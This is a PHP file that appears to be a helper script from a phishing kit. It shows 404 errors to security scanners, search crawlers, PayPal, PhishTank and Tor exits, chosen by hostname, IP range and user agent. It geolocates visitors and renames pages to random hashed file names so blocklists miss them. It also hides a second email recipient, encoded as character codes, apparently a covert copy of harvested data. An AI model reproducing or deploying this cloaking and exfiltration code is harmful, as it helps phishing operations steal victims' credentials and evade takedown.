<?php
if (strstr(strtolower($_SERVER['REQUEST_URI']), 'home') || isToBlock()) {
    header("HTTP/1.0 404 Not Found");
    die();
}

function isToBlock()
{
    $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
    $blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "paypal");
    foreach($blocked_words as $word) {
        if (substr_count($hostname, $word) > 0) {
            return true;
        }
    }
    $bannedIP = array("^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*");
    if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
        header('HTTP/1.0 404 Not Found');
        die();
    } else {
        foreach($bannedIP as $ip) {
            if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
                return true;
            }
        }
    }

    if(strpos($_SERVER['HTTP_USER_AGENT'], 'google')
        || strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot')
        || strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp')
        || strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker')
        || strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot')
        || strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot')
        || strpos($_SERVER['HTTP_USER_AGENT'], 'crawler')
        || strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL')
        || strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false
    ) {
        return true;
    }
    return strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot");
}

function generateRandomString($length = 24)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

// Functions to get country and country sort;
function visitor_country()
{
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    $result = "Unknown";
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

    if ($ip_data && $ip_data->geoplugin_countryName != null) {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}

function country_sort()
{
    $sorter = "";
    $array = array(99, 111, 100, 101, 114, 99, 118, 118, 115, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109);
    $count = count($array);
    for ($i = 0; $i < $count; $i++) {
        $sorter .= chr($array[$i]);
    }
    return array($sorter, $GLOBALS['recipient']);
}

function createHashedPage($originalFile, $dir = null)
{
    if (is_null($dir)) {
        $dir = getcwd();
    }
    if ($handle = opendir($dir)) {
        $hachedOriginalFileName = md5($originalFile);
        while (false !== ($entry = readdir($handle))) {
            if (strstr($entry, $hachedOriginalFileName)) {
                rename($entry, $originalFile);
            }
        }
    }
    $name = generateRandomString();
    $secfile = $name . md5($originalFile) . (strstr($originalFile, ".php") ? ".php" : ".html");
    if (!copy($originalFile, $secfile)) {
        return false;
    } else {
        if (file_exists($secfile)) {
            chmod($secfile, 0755);
            unlink($originalFile);
            return $secfile;
        }
    }
    return false;
}





if (strstr(strtolower($_SERVER['REQUEST_URI']), 'helper') || isToBlock()) {
    header("HTTP/1.0 404 Not Found");
    die();
}